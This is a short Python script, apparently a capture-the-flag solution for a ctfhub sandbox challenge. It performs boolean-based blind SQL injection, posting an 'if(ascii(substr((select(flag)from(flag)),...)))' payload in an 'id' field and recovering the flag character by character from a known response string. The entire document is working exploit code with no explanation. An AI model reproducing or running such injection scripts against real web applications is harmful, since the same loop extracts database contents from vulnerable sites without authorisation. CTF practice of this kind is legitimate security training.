import requests

url = 'http://challenge-4b15f3e5f1087bca.sandbox.ctfhub.com:10080/index.php'
result = ''

for x in range(1, 50):
    for j in range(48,126):

        payload = 'if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)'%(x,j);
        #print(payload)
        data = {
            "id":payload,
        }
        response = requests.post(url, data = data)
        if "Hello, glzjin wants a girlfriend." in response.text:
            result = result + chr(int(j))
            print(result)
            break
       
